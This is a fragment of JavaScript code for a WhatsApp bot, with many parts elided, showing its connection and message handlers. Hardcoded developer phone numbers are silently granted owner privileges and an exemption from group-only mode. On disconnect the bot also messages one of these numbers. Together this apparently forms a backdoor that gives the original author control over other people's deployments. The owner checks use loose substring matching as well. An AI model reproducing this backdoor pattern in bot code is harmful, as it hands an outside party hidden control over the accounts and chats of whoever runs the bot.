...
async function connectToWA() {
    ...
    conn.ev.on('connection.update', async (update) => {
        ...
        if (connection === 'close') {
            ...
            await conn.sendMessage("94742614390@s.whatsapp.net", {
    ...
    conn.ev.on('messages.upsert', async (mek) => {
        try {
            ...
            const developers = '94742614390,94714906887'
            const isbot = botNumber.includes(senderNumber)
            const isdev = developers.includes(senderNumber)
            const isMe = isbot ? isbot : isdev
            const sadas = '94742614390'
const isSadas = sadas?.includes(senderNumber)
 const isOwner = ownerNumber.includes(senderNumber) || isMe
    ...
    if (!isGroup&& !isSadas&&  !isbot&& !isOwner&& config.ONLY_GROUP == 'true') return
